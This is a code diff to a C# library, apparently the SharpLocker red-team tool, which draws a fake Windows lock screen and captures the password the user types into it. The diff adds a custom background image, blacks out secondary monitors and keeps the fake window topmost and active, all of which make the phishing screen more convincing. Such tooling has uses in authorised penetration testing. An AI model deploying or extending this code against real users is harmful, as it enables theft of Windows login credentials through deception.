@@ -1,7 +1,6 @@
 ﻿using System;
 using System.ComponentModel;
 using System.Drawing;
-using System.Threading;
 using System.Windows.Forms;
 using System.Runtime.InteropServices;
 
@@ -11,11 +10,55 @@ namespace  SharpLockerLib
     {
         public static String Run()
         {
+            return Run("");
+        }
+
+        public static String Run(string backGroundPath)
+        {
             Application.EnableVisualStyles();
-            Application.SetCompatibleTextRenderingDefault(false);
+            try
+            {
+                Application.SetCompatibleTextRenderingDefault(false);
+            } catch(Exception)
+            {
+                // avoid exception if an IWin32Window-Object was created already
+            }
+            
             StrResult res = new StrResult();
-            Form1 f = new Form1(ref res);
-            Application.Run(f);
+            Form1 f;
+            if (backGroundPath.Length > 1)
+            {
+                f = new Form1(ref res, backGroundPath);
+            } else
+            {
+                f = new Form1(ref res);
+            }
+            
+
+            foreach (var screen in Screen.AllScreens)
+            {
+                if (!screen.Primary)
+                {
+                    Form form = new Form();
+                    form.WindowState = FormWindowState.Normal;
+                    form.StartPosition = FormStartPosition.Manual;
+                    form.Location = new Point(screen.WorkingArea.Left, screen.WorkingArea.Top);
+                    form.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
+                    form.Size = new Size(screen.Bounds.Width, screen.Bounds.Height);
+                    form.BackColor = Color.Black;
+                    form.Visible = false;
+                    form.Show(f);
+                }
+            }
+
+            f.Show();
+            f.BringToFront();
+            f.Activate(); // assure this form is the active window
+            while (!f.IsDisposed)
+            {
+                Application.DoEvents();
+            }
+ 
             return "SharpLocker input: " + res.val;
         }
     }
@@ -29,7 +72,11 @@ namespace  SharpLockerLib
     {
         StrResult input;
 
-        public Form1(ref StrResult result)
+        public Form1(ref StrResult result) : this(ref result, @"C:\Windows\Web\Wallpaper\Windows\img0.jpg")
+        {
+        }
+
+        public Form1(ref StrResult result, string userBackground)
         {
             this.input = result;
             InitializeComponent();
@@ -42,7 +89,7 @@ namespace  SharpLockerLib
             // ToDo: Replace with user background image
             // this requires access to Windows.System.UserProfile.LockScreen.OriginalImageFile.OriginalString
             // without beeing an UWP app
-            Image myimage = new Bitmap(@"C:\Windows\Web\Wallpaper\Windows\img0.jpg");
+            Image myimage = new Bitmap(userBackground);
             BackgroundImage = myimage;
             BackgroundImageLayout = ImageLayout.Stretch;
             this.TopMost = true;
@@ -62,16 +109,6 @@ namespace  SharpLockerLib
             label2.Top = usernameh;
             label1.Top = locked;
             textBox2.UseSystemPasswordChar = true;
-
-
-            foreach (var screen in Screen.AllScreens)
-            {
-                if (!screen.Primary)
-                {
-                    Thread thread = new Thread(() => WorkThreadFunction(screen));
-                    thread.Start();
-                }
-            }
 
 
         }
@@ -129,27 +166,6 @@ namespace  SharpLockerLib
             }
         }
 
-        public void WorkThreadFunction(Screen screen)
-        {
-            try
-            {
-                using (Form form = new Form())
-                {
-                    form.WindowState = FormWindowState.Normal;
-                    form.StartPosition = FormStartPosition.Manual;
-                    form.Location = new Point(screen.WorkingArea.Left, screen.WorkingArea.Top);
-                    form.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
-                    form.Size = new Size(screen.Bounds.Width, screen.Bounds.Height);
-                    form.BackColor = Color.Black;
-                    form.ShowDialog();
-                }
-            }
-            catch (Exception)
-            {
-                // log errors
-            }
-        }
-
         private void userPic_Click(object sender, EventArgs e)
         {
 
@@ -173,7 +189,7 @@ namespace  SharpLockerLib
         }
 
         protected override void OnClosing(CancelEventArgs e)
-        {
+        {    
             Taskbar.Show();
             base.OnClosing(e);
         }
@@ -191,7 +207,8 @@ namespace  SharpLockerLib
         private void confirmBtnClick(object sender, EventArgs e)
         {
             Taskbar.Show();
-            System.Windows.Forms.Application.Exit();
+            //System.Windows.Forms.Application.Exit();
+            this.Close();
         }
     }
 }
